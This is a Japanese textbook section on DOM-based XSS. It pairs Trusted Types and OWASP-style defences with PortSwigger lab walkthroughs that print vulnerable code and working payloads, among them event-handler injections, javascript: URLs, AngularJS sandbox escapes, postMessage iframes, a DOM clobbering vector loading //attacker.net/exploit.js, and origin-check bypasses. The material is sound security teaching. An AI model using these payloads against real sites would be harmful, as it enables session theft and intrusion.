(1) 問題コードを書き換える、(2) ライブラリを使う、(3) Trusted Type ポリシーを作る、(4) 最後の手段としてデフォルトポリシーを作る。

**(1) 書き換え**（worse → better）。

```javascript
el.innerHTML = '<img src=xyz.jpg>';
```

```javascript
el.textContent = '';
const img = document.createElement('img');
img.src = 'xyz.jpg';
el.appendChild(img);
```

**(2) ライブラリ**。DOMPurify は Trusted Types をサポートし、`TrustedHTML` にラップして返すのでブラウザが違反を出さない。

```javascript
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(html, {RETURN_TRUSTED_TYPE: true});
```

ただし注意。DOMPurify のサニタイズロジックにバグがあれば、アプリは依然 DOM XSS を抱える。**Trusted Types は値を「何らかの形で」処理することを強制するが、正確な処理規則や安全性までは定義しない**。

**(3) ポリシーを自作**。

```javascript
if (window.trustedTypes && trustedTypes.createPolicy) { // Feature testing
  const escapeHTMLPolicy = trustedTypes.createPolicy('myEscapePolicy', {
    createHTML: string => string.replace(/\</g, '&lt;')
  });
}
```

```javascript
const escaped = escapeHTMLPolicy.createHTML('<img src=x onerror=alert(1)>');
console.log(escaped instanceof TrustedHTML);  // true
el.innerHTML = escaped;  // '&lt;img src=x onerror=alert(1)>'
```

**(4) デフォルトポリシー**。CDN の第三者ライブラリなどコードを変えられない場合に使う。ただし使用は控えめにし、通常のポリシーへのリファクタを優先する。

```javascript
if (window.trustedTypes && trustedTypes.createPolicy) { // Feature testing
  trustedTypes.createPolicy('default', {
    createHTML: (string, sink) => DOMPurify.sanitize(string, {RETURN_TRUSTED_TYPE: true})
  });
}
```

### 強制モードへの切り替え

違反をすべて潰したら、`-Report-Only` を外して強制する。

```text
Content-Security-Policy: require-trusted-types-for 'script'; report-uri //my-csp-endpoint.example
```

この効果は大きい。アプリがどれだけ複雑でも、**DOM XSS を導入しうるのはポリシー内のコードだけ**になる。そしてそのポリシー生成自体も `trusted-types` CSP ディレクティブでさらに制限できる。攻撃者が突くべき面が、アプリ全体から数個のポリシー関数に縮む、というのが設計上の狙いである。

---

## 7. DOM XSS の歴史と一次文献

DOM XSS の知識体系がどこから来たかを知っておくと、資料を辿りやすくなる。

DOMXSS Wiki は「攻撃者制御可能な入力の source と、DOM Based XSS を生みうる sink を定義するナレッジベース」である。主たるメンテナは **Stefano Di Paola**、貢献者は **Mario Heiderich, Frederik Braun, Giuseppe Trotta**。スポンサーは Minded Security。原文は「DOMXSS は 2005年の Amit Klein の論文で初めて徹底的に文書化されて以来、重要性を増してきたが、情報を集める中心的な場所を欠いている」と述べる。

主要な一次文献は次のとおり。

1. http://www.webappsec.org/projects/articles/071105.shtml "DOM Based Cross Site Scripting or XSS of the Third Kind", A. Klein, 2005.
2. http://blog.watchfire.com/wfblog/2008/06/javascript-code.html "JavaScript Code Flow Manipulation... Adobe Flex 3 Dom-Based XSS", O. Segal & A. Sharabani, A. Yogev, June 2008.
3. http://www.ruxcon.org.au/files/2008/Attacking_Rich_Internet_Applications.pdf Attacking Rich Internet Applications, S. Di Paola & A. Kuza, 2008.
4. http://kuza55.blogspot.com/2008/02/understanding-cookie-security.html Understanding Cookie Security, A. Kuza, 2008.
5. http://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf Http Parameter Pollution, L. Carettoni & S. Di Paola, 2009.
6. http://dev.w3.org/html5/webdatabase/ W3C ClientSide Database
7. http://dev.w3.org/html5/webstorage W3C Web Storage
8. http://msdn.microsoft.com/en-us/library/cc197062%28VS.85%29.aspx Microsoft's Introduction to DOM Storage

---

## 8. PortSwigger DOM系ラボの実物コード・ペイロード・解説

ここからは、PortSwigger の Web Security Academy が出題する各 DOM 系ラボについて、**脆弱なコードの実物 → 攻撃ペイロード → なぜ動くか**をコードで示す。原資料では portswigger.net 本体を直接取得できなかったため、複数の独立した公開ラボ解説から相互検証した内容である。ラボは自分のインスタンス（`YOUR-LAB-ID` を自分の値に置き換える）で、許可された範囲として手を動かせる。

### 8.1 `document.write` sink + source `location.search`（Apprentice）

ラボ: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

脆弱コード（検索語トラッキング。`location.search` から取った `query` を無害化せず `document.write` に補間）。

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```

攻撃ペイロード。

```text
?search="'><svg onload=alert(1)>
```

なぜ動くか: `"` で `src` の二重引用符を閉じ、`>` で `<img>` タグを閉じ、続く `<svg onload=alert(1)>` が新要素として書き込まれる。`document.write` はHTMLとして直接パースされるので `onload` が発火する。DOM Invader の汎用ペイロードは `"'>` を使い、二重/単一引用符どちらのコンテキストからも抜けられるようにしている。

### 8.2 `document.write` sink inside a `<select>` element（Practitioner）

ラボ: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

脆弱コード（`storeId` を `<option>` 内に補間）。

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>'); // 注入点
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) { continue; }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

攻撃ペイロード（まず `<option>` を閉じてから注入）。

```text
?productId=1&storeId=</option><script>alert(1)</script>
```

教訓: `<select>` / `<textarea>` / `<option>` の内側が注入点のときは、**まず該当要素を閉じてから**でないと実行可能なJSを入れられない。`document.write` 経由なので `<script>` も実行される（この点が後述の `innerHTML` との重要な対比になる）。

### 8.3 `innerHTML` sink + source `location.search`（Apprentice）

ラボ: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

脆弱コード。

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) { doSearchQuery(query); }
```

攻撃ペイロード（イベントハンドラ付き要素を使う）。

```text
?search=<img src=x onerror=alert(1)>
```

なぜ `<script>` ではだめか: 現代ブラウザは `innerHTML` 代入で挿入された `<script>` を実行せず、`svg onload` も発火しない。`<img src=x onerror=...>` は無効な `src` の読み込み失敗で `onerror` が確実に発火するため定番になる。8.2 の「`document.write` なら `<script>` が実行される」との違いを押さえておく。

### 8.4 jQuery `href` 属性 sink + source `location.search`（Apprentice）

ラボ: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

脆弱コード（`returnPath` を `.attr("href", ...)` にそのまま渡す）。

```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

攻撃ペイロード（`javascript:` 疑似プロトコル。**クリックで発火**する点が 8.1〜8.3 と違う）。

```text
?returnPath=javascript:alert(document.cookie)
```

このラボは `alert(1)` ではなく `alert(document.cookie)` を要求する。盗んだ値がセッションデータへアクセスできることを示すためである。対策は「相対パス（`/` 始まり）に限定」「`javascript:`/`data:`/`vbscript:` を拒否」。

### 8.5 jQuery セレクタ sink + `hashchange` イベント（Apprentice）

ラボ: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

要点: `hashchange` を購読し、`location.hash` を jQuery の `$()` セレクタにそのまま渡す。`$()` は `<` で始まる入力を**CSSセレクタではなくHTMLとして**解釈し要素を生成するため XSS になる。

直接テスト。

```text
#<img src=1 onerror=print()>
```

被害者へ配信する Exploit Server ペイロード（iframe を読み込んでから `src` にハッシュを追記し `hashchange` を発火させる）。

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```

対策: `location.hash` を `$()` に直接渡さない。ID取得なら `document.getElementById(location.hash.substring(1))`、どうしてもセレクタなら `$.escapeSelector()` を使う。

### 8.6 AngularJS 式（Client-Side Template Injection, Practitioner）

ラボ: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

要点: `ng-app` を持つページで、ユーザ入力が `{{ }}` 式の中に反射される。これを CSTI（Client-Side Template Injection, クライアントサイドテンプレートインジェクション）と呼ぶ。角括弧 `< >` がサーバ側でエンコードされていても、AngularJS の式評価を使えば実行できる。旧 AngularJS のサンドボックスは prototype chain 経由でバイパスできる。

攻撃ペイロード（`constructor.constructor` で Function コンストラクタに到達）。

```text
?search={{constructor.constructor('alert(1)')()}}
```

段階分解: `constructor`（スコープオブジェクトの constructor＝Object）→ `constructor.constructor`（Object の constructor＝グローバル `Function`）→ `Function('alert(1)')`（コード文字列から関数生成）→ `()`（実行）。対策: 式の中にユーザ入力を反射させない／AngularJS 1.6 以降（サンドボックス廃止、SCE で厳格化）／CSP で `unsafe-eval` を無効化すると Function コンストラクタが止まる。

### 8.7 Web message を source にしたラボ群

ラボ: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

**(a) DOM XSS using web messages**（`innerHTML` sink）。

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
```

Exploit Server ペイロード（`postMessage` の第2引数 `'*'` は「どの targetOrigin でも許可」＝送信側は誰でも送れる）。

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

**(b) web messages and a JavaScript URL**（`location.href` sink、`indexOf` の緩い検査）。

```javascript
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

ペイロード（`//http:` を末尾に付けて文字列一致だけ通し、本体は `javascript:` 疑似プロトコル）。

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

**(c) web messages and `JSON.parse`**（`iframe.src` sink）。

```javascript
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try { d = JSON.parse(e.data); } catch(e) { return; }
    switch(d.type) {
        case "page-load": ACMEplayer.element.scrollIntoView(); break;
        case "load-channel": ACMEplayer.element.src = d.url; break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px"; break;
    }
}, false);
```

ペイロード（JSONで `type:"load-channel"` と `url:"javascript:print()"` を送る）。

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

**origin 検証の欠陥パターン**（出典: https://github.com/DK9510/web-app-exploitation ）。受信側が origin を検査していても、`indexOf`/`startsWith`/`endsWith` による部分一致は破れる。

```javascript
// 悪い例1: 部分文字列一致
if (e.origin.indexOf('normal-web.com') > -1) { eval(e.data) }
//   → http://www.normal-web.com.attacker.net で通ってしまう
// 悪い例2: endsWith
if (e.origin.endsWith('normal-website.com')) { eval(e.data) }
//   → http://www.malicious-websitenormal-website.com で通ってしまう
```

正しくは `e.origin === 'https://normal-website.com'` の完全一致で検証する。

### 8.8 DOM-based open redirection（Apprentice）

ラボ: https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection

脆弱コード（`location` から正規表現で `url=` を抜き、`location.href` に代入）。

```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```

攻撃URL。

```text
/post?postId=4&url=https://ATTACKER-SERVER/
```

補足: このラボは `https?://` の前置が固定なのでリダイレクト先の先頭を奪えず、任意JS実行はできずフィッシング目的のリダイレクトになる。**もしリダイレクト先URLの先頭を制御できる**場合は `javascript:alert(1)` で任意コード実行に格上げされる。

### 8.9 DOM-based cookie manipulation（Apprentice）

ラボ: https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation

脆弱コード（`window.location` を無害化せず `document.cookie` に格納。後で別ページがその値をHTML属性に反射）。

```javascript
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
```

Exploit Server ペイロード（iframe が汚染URLを一度読み込んでクッキーに保存させ、`onload` でホームへ遷移させると反射先で実行される）。

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

反射先が属性コンテキストの場合の別解（`onfocus`＋自動フォーカス用フラグメント）。

```text
/product?productId=1&' id=x tabindex=1 onfocus=print() random='value'>#x
```

### 8.10 DOM clobbering ラボ（Expert）

ラボ: https://portswigger.net/web-security/dom-based/dom-clobbering

DOM clobbering は、XSS が直接は不可能でも `id`/`name` 属性が許可リストに入っている状況で、**同名の要素を注入してグローバル変数を上書き**する技法。典型的な脆弱コード。

```javascript
window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
};
```

clobbering ベクタ（2つの同一 `id` の anchor が DOM collection にまとめられ、`name=url` で `someObject.url` を上書き）。

```html
<a id=someObject><a id=someObject name=url href=//attacker.net/exploit.js>
```

**(a) Exploiting DOM clobbering to enable XSS**（DOMPurify を使うが `cid:` を許すコメント機能）。コメント投稿。

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

投稿後にもう一つ適当なコメントを投稿すると `{avatar: 'cid:"onerror=alert(1)//'}` として XSS が発火する。

**(b) Clobbering DOM attributes to bypass HTML filters**（HTMLJanitor の `attributes` プロパティ clobbering）。コメント投稿。

```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

原理: フィルタは `element.attributes` を列挙して危険属性を除去するが、`<input id=attributes>` で `attributes` プロパティを DOM ノードに clobber すると、フィルタのループ条件（`i < element.attributes.length`）が満たされず素通しし、`onfocus=print()` が残る。Exploit Server から `#x` フラグメントで自動フォーカスさせて発火。

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?postId=X" onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>
```

### 8.11 DOM XSS の検出手順（PortSwigger 流）

出典: https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets

- ブラウザ DevTools の **Sources/Debugger** タブでページ内の `<script>` と全JSファイルを開き、**source**（`location.*`, `document.cookie`, `document.referrer`, `window.name`, `postMessage` の `e.data` など）と **sink**（前編の一覧）を検索する。静的JSファイルも必ず対象にする。
- source が sink に無検証で流れていないか（taint flow）を目視で追う。前編の正規表現と併用する。
- 参照ツール: DOM Invader、CyberChef（ペイロードのエンコード）、PayloadsAllTheThings の XSS フォルダ。

> ### 📌 ここは自分で開いて読んでください
> **資料**: PortSwigger Web Security Academy DOM-based ラボ群 — https://portswigger.net/web-security/dom-based
> **なぜ**: 本教科書の執筆環境からは portswigger.net 本体を自動取得できなかった（理由: サイト側の egress 制限）。上の 8.1〜8.11 のコード・ペイロードは複数の公開 writeup（Ahmed-Abdulqader, thelicato, cel1s0, ChrisM-X, DK9510 の各リポジトリ）から相互検証した要約である。
> **読みどころ**:
> 1. 各ラボの冒頭定義と "Which sinks…" のカテゴリ表を読む
> 2. Solution を開く前に、自力で脆弱コードを読んで source→sink を特定する練習をする
> 3. 自分のラボインスタンスID（`YOUR-LAB-ID`）に置き換えて実際にペイロードを打ち、DOM Invader でフローを観測する
> **代替手段**: 上記5つの GitHub writeup リポジトリ（すべて無料で閲覧可）

---

## 9. 読者が自分で開くべき資料

### (A) 元記事（Qiita）— 取得不可

本節の名目上の元資料である Qiita 記事（https://qiita.com/nozomi2025/items/909d552cec761c6412f2 ）は、本教科書の執筆環境からは一切取得できなかった。外向きHTTPS通信を通す egress プロキシが `qiita.com:443` を組織ポリシーで遮断し（403 policy denial）、web.archive.org・r.jina.ai・webcache.googleusercontent.com などのミラーもすべて同じ 403 で到達不能だったためである。GitHub 上にミラーも存在しない（記事ID/著者名で検索して0件）。**したがってこの記事固有の日本語の言い回し・図解・演習・著者独自の分類は本節に含まれていない。**

読者自身がブラウザで開いたときの読みどころは次の6点である。

1. **DOMベースXSSの定義**: 「サーバのレスポンスHTMLには攻撃文字列が現れない（ゆえにサーバ側ログやWAFで見えない）」をどう説明しているか。前編の OWASP の説明（サーバ側注入 vs クライアント側注入）と突き合わせ、日本語の用語対応（source=入力源、sink=出力先/危険な関数）を確認する。
2. **source の一覧と優先度**: 記事が `location.hash` / `location.search` / `postMessage` の `event.data` / `window.name` のどれを「実務で最頻」として挙げているか。日本語圏の記事は `location.hash` 起点の例を好む傾向がある。
3. **sink の一覧と jQuery への言及**: `html()`・`append()`・`$()` のバージョン別条件に相当する記述があるか。古い日本語記事では `$()` にセレクタとして渡す危険が軽視されがちなので、記述が正確かを確認する。
4. **サンプルコード**: 記事の脆弱コードが `location.hash.split("#")[1]` → `document.write(x)` 型か、`innerHTML` 型か、`eval` 型か。修正版が `textContent` を使っているか（OWASP RULE #6/#7 と一致するか）。
5. **検出手順**: 「DevTools の Sources でブレークポイント」「grep/正規表現」「Burp DOM Invader」のどれを推しているか。日本語での DevTools 操作手順があれば実習に有用。
6. **対策の記述**: 「エスケープすればよい」で終わっていないか。RULE #3 の「JavaScript エンコードは実行コンテキストでは防御にならない」、4.4 の「`innerText` も `script` 要素では実行される」、Trusted Types に相当する記述があるかを確認する。ここが記事の質を判断する分かれ目。

> ### 📌 ここは自分で開いて読んでください
> **資料**: 元記事（Qiita, DOMベースXSS）— https://qiita.com/nozomi2025/items/909d552cec761c6412f2
> **なぜ**: 本教科書の執筆環境から自動取得できなかった（理由: サイト側の egress 制限。ミラーも到達不能）。本節の内容は元記事ではなく、同一テーマの一次資料（OWASP・PortSwigger・web.dev・DOMXSS Wiki）にもとづく代替補完である。
> **読みどころ**: 上の6項目を参照。特にサンプルコードと対策の記述を一次資料と突き合わせること。
> **代替手段**: 下記(B)の一次資料一式（すべて無料で読める）

### (B) 代替に使った一次資料（直接あたるべき順）

| 順 | 資料 | 何を読むか |
| --- | --- | --- |
| 1 | https://github.com/wisec/domxsswiki/wiki | source/sink の原典。特に直接実行 sink、location系 source、DOMXSS の発見（正規表現） |
| 2 | https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html | RULE #1〜#7、GUIDELINE #1〜#10。特に RULE #3 の実行例 |
| 3 | https://portswigger.net/web-security/dom-based | source/sink の定義とカテゴリ別 sink 一覧の原典。各ラボに対応 |
| 4 | https://portswigger.net/burp/documentation/desktop/tools/dom-invader | DOM Invader の公式ドキュメント |
| 5 | https://web.dev/articles/trusted-types | Trusted Types の導入手順 |
| 6 | https://github.com/mozilla/eslint-plugin-no-unsanitized | 検出の自動化 |
| 7 | http://www.webappsec.org/projects/articles/071105.shtml | Amit Klein, 2005（DOM XSS の原論文） |

---

## 10. 検証・倫理に関する注記

本節に記載した攻撃手法・ペイロードは、**自分が所有するシステム、または明示的に許可された範囲（バグバウンティのスコープ内・診断契約内・自分で立てた検証環境）でのみ**使用すること。PortSwigger のラボは学習目的で公開されており、自分のインスタンスに対して手を動かすのは正当である。

source/sink の列挙と taint flow の追跡は、本来は**防御側のコードレビューと修正**（sink の置き換え、Trusted Types の導入）を目的とした診断技術である。攻撃ペイロードは「その sink が本当に危険か」を確認するための最小限の実証（`alert(1)` や `print()`）にとどめ、実データの窃取や第三者への被害を伴う操作は行わないこと。見つけた脆弱性は、対象のバグバウンティプログラムや所有者の窓口を通じて責任を持って報告する。

---

## 手を動かす

1. **Burp Suite を用意する**。Community 版でよい。**Proxy ➜ Intercept ➜ Open Browser** で組み込みブラウザを開く。
2. **DOM Invader を有効化する**。右上の Burp Suite ロゴ ➜ **DOM Invader** タブ ➜ **Enable DOM Invader** を ON ➜ **Reload**。`F12` で DevTools を開き **DOM Invader** パネルを確認する。
3. **練習対象を用意する**。PortSwigger の DOM XSS ラボ（8.3 の innerHTML ラボが最初に向く）を自分のアカウントで開く。URLの `YOUR-LAB-ID` は自分のインスタンス値になる。
4. **canary を注入する**。DOM Invader パネルの **Inject URL params** を押し、canary が sink に届くか観測する。届いた sink のコンテキスト（HTML/属性/URL/JS）を確認する。
5. **ペイロードを打つ**。8.3 なら `?search=<img src=x onerror=alert(1)>` をURLに付けて読み込み、`alert` が出るか確認する。出たら DevTools の Sources で該当 sink 行を特定する。
6. **修正を試す**。手元にコードがあるなら、`innerHTML` を `textContent` に置き換え、同じペイロードが無害化されることを確かめる（RULE #6/#7）。
7. **Trusted Types を試す**。自分の検証ページで `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'` を付け、`innerHTML` 代入で違反レポートが出るのを確認してから、ポリシーを1つ作って強制モードに切り替える。
8. **postMessage を検査する**。8.7 の web message ラボで、DOM Invader の **Messages** サブタブに `postMessage` が記録されるのを見て、`data` を編集して再送する。

## つまずきポイント

- **`innerHTML` に `<script>` を入れても実行されない**。「XSS が出ない＝安全」ではない。`<img src=x onerror=...>` や `<svg onload=...>` を使う。8.3 と 8.2 の違い（`document.write` なら `<script>` も実行）を混同しない。
- **「エスケープすれば安全」は誤り**。RULE #3 のとおり、実行コンテキスト（イベントハンドラや `setTimeout` の文字列引数）では JavaScript エンコードは防御にならない。値がそのまま実行される。
- **`innerText` を「安全」と思い込む**。`script` 要素に代入すると実行される（4.4）。「普通は安全」なメソッドでも対象要素の種類を確認する。
- **`setAttribute` はどの属性かで危険度が違う**。`onclick` など実行系属性に使うと値がコードに型強制される。GUIDELINE #3 の安全属性リストの外は危険と考える。
- **HttpOnly を外すとクッキー窃取が一発で通る**。`SESSION_COOKIE_HTTPONLY = False` のようなアプリは、XSS が出た瞬間に `document.cookie` を読まれてセッションを奪われる。
- **origin 検証の `indexOf`/`endsWith` は破れる**。`postMessage` の受信側は完全一致（`===`）で検証する。
- **DOM Invader の重い sink**。`eval`・`innerHTML` の計装はページ機能を壊すことがある。一時的に無効化して切り分ける。
- **canary に一般的な文字列を使うと誤検知する**。`test` ではなくランダムな固有値を使う。

## この節のまとめ

- DOM Invader は Burp 内蔵のブラウザツールで、source から sink への汚染フローを canary で実時間観測できる。prototype pollution・DOM clobbering・postMessage の検査もできる。
- canary は追跡用のランダム文字列。空の canary 検索で全 sink を洗い出せる。
- OWASP の RULE #1〜#7 は「どのサブコンテキストに、どの順でエンコードするか」を定める。HTML→JS、属性はJSのみ、CSSはURL→JS、URLはURL→JS。
- RULE #3 が最重要。実行コンテキスト（イベントハンドラ・`setTimeout` 文字列など）では **JavaScript エンコードは防御にならない**。エンコードされた文字列がそのまま実行される。第一の対策は「そこに信頼できないデータを入れない」こと。
- RULE #6/#7 の核心は「正しい sink を選ぶ」。`innerHTML` ではなく `textContent`/`innerText` を使う。`eval` にユーザ入力を渡すのは常に悪手でサニタイズより回避。
- GUIDELINE は設計方針。テキストとして扱う、DOM API で組む、暗黙 `eval` を避ける、右辺だけに使う、`JSON.parse` を使う、`JSON.stringify` は出力エンコードではない。
- 落とし穴: 文脈が渡り歩く（Complex Contexts）、ライブラリの denylist/allowlist の差、`text/xhtml` や `.value` 取得でエンコードが無効化、`innerText` も `script` 要素で実行。
- 部分的サニタイズの隙は stored DOM XSS になり、HttpOnly を外していると即セッション奪取。自動化ボットのフローは `javascript:` URL や `window.name` で秘密を流出させられる。
- Trusted Types（`require-trusted-types-for 'script'`）は sink に文字列を渡せなくする根本対策。報告モードで違反を洗い出してから強制する。DOM XSS を導入しうる場所がポリシー内に集約される。
- PortSwigger の各 DOM 系ラボは「脆弱コード → ペイロード → 原理」で読める。`document.write` は `<script>` も実行、`innerHTML` はイベントハンドラ要素が必要、jQuery `href` は `javascript:`、`$()` はHTML解釈、AngularJS は `constructor.constructor`。
- 検出は DevTools の Sources で全JSを開き、source→sink の taint flow を目視で追い、DOM Invader と正規表現で補強する。
- 攻撃手法は許可された範囲でのみ、最小限の実証にとどめ、責任を持って報告する。

## 理解度チェック

1. `element.innerHTML = query` に `?search=<script>alert(1)</script>` を渡しても alert が出ないのはなぜか。どうすれば発火するか。
   ▶ 答え: 現代ブラウザは `innerHTML` で挿入された `<script>` を実行しないため。`<img src=x onerror=alert(1)>` のようにイベントハンドラ付き要素を使えば、`onerror` が確実に発火して実行される。

2. RULE #3 が「JavaScript エンコードは防御にならない」と言うのはどのコンテキストか。理由は。
   ▶ 答え: イベントハンドラや JavaScript コードサブコンテキスト（`setAttribute("onclick", ...)`・`setTimeout` の文字列引数など）。JavaScript エンコードは ECMAScript が国際文字や文字列の別表現をサポートするための仕組みで、エンコードされた文字列も有効なコードとして実行されてしまうから。

3. `document.write` の sink と `innerHTML` の sink で、`<script>` タグの扱いはどう違うか。
   ▶ 答え: `document.write` はHTMLとして直接パースするので `<script>` も実行される。`innerHTML` 代入では `<script>` は実行されない。だから `document.write` の select ラボ（8.2）は `<script>alert(1)</script>` が使えるが、innerHTML ラボ（8.3）は使えない。

4. jQuery の `$(location.hash)` が XSS になるのはなぜか。対策は。
   ▶ 答え: `$()` は `<` で始まる入力をCSSセレクタではなくHTMLとして解釈し要素を生成するため。対策は `location.hash` を `$()` に直接渡さないこと。ID取得なら `document.getElementById(location.hash.substring(1))`、セレクタなら `$.escapeSelector()` を使う。

5. Trusted Types を「報告モード」で導入する意味は何か。使うヘッダは。
   ▶ 答え: いきなり強制するとアプリが壊れるので、まず違反箇所を洗い出すため。`Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; report-uri //my-csp-endpoint.example` を使う。違反を潰してから `-Report-Only` を外して強制する。

6. `postMessage` の受信側で `if (e.origin.indexOf('normal-website.com') > -1)` という検証が破られる例を1つ挙げよ。正しい書き方は。
   ▶ 答え: `http://www.normal-website.com.attacker.net` のように攻撃者ドメインに正規ドメインを含めると部分一致で通る。正しくは `e.origin === 'https://normal-website.com'` の完全一致で検証する。

7. `innerText` は `innerHTML` より安全と言われるが、危険になるのはどんな場合か。
   ▶ 答え: `script` 要素に `innerText` で代入した場合。その中身が JavaScript として実行される。「普通は安全」なメソッドでも対象要素の種類を確認する必要がある。

8. AngularJS ラボの `{{constructor.constructor('alert(1)')()}}` はどう動くか、段階を説明せよ。
   ▶ 答え: `constructor`（スコープの constructor＝Object）→ `constructor.constructor`（Object の constructor＝グローバル `Function`）→ `Function('alert(1)')`（文字列から関数生成）→ `()`（実行）。角括弧をエンコードされても式評価で実行できる。CSP の `unsafe-eval` 無効化で Function コンストラクタを止められる。

9. DOM Invader の canary を「空」で検索すると何が分かるか。
   ▶ 答え: 悪用可能性に関係なく、ページ上のすべての sink が明らかになる。どこに sink があるかの偵察（全体把握）に有用。

10. `JSON.stringify()` の出力をそのまま HTML に埋め込んではいけないのはなぜか。正しい扱いは。
   ▶ 答え: `JSON.stringify()` は出力エンコード関数ではなく、`<`・`>`・`&`・`"`・`'` などが周囲のコンテキストから抜け出して XSS を許すため。別の JSON レスポンスとして返して `JSON.parse()` で読むか、sink に応じてエンコードしてから埋め込む。

## 出典

- https://qiita.com/nozomi2025/items/909d552cec761c6412f2 （取得不可・二次補完）
- https://portswigger.net/burp/documentation/desktop/tools/dom-invader
- https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/dom-invader.md
- https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/dom-xss.md
- https://web.dev/articles/trusted-types
- https://github.com/wisec/domxsswiki/wiki
- https://portswigger.net/web-security/dom-based
- https://portswigger.net/web-security/cross-site-scripting/dom-based
- https://github.com/Ahmed-Abdulqader/portswigger-labs
- https://github.com/thelicato/portswigger-labs
- https://github.com/cel1s0/offsec-notes
- https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets
- https://github.com/DK9510/web-app-exploitation
- http://www.webappsec.org/projects/articles/071105.shtml

<!-- sources: https://qiita.com/nozomi2025/items/909d552cec761c6412f2, https://portswigger.net/burp/documentation/desktop/tools/dom-invader, https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html, https://web.dev/articles/trusted-types, https://github.com/wisec/domxsswiki/wiki, https://portswigger.net/web-security/dom-based, https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/dom-xss.md -->
<!-- terms: DOMベースXSS, source, sink, 汚染フロー（taint flow）, DOM Invader, canary, prototype pollution, DOM clobbering, レンダリングコンテキスト, 実行コンテキスト, サブコンテキスト, JavaScriptエンコード, HTMLエンコード, textContent, innerHTML, Trusted Types, TrustedHTML, CSP, require-trusted-types-for, postMessage, origin検証, CSTI, DOMPurify, HttpOnly, stored DOM XSS -->
<!-- self-read: https://portswigger.net/burp/documentation/desktop/tools/dom-invader | サイト側のegress制限で自動取得できず、二次情報ベース -->
<!-- self-read: https://portswigger.net/web-security/dom-based | サイト側のegress制限で自動取得できず、公開writeupから相互検証 -->
<!-- self-read: https://qiita.com/nozomi2025/items/909d552cec761c6412f2 | サイト側のegress制限で取得不可、一次資料で代替補完 -->
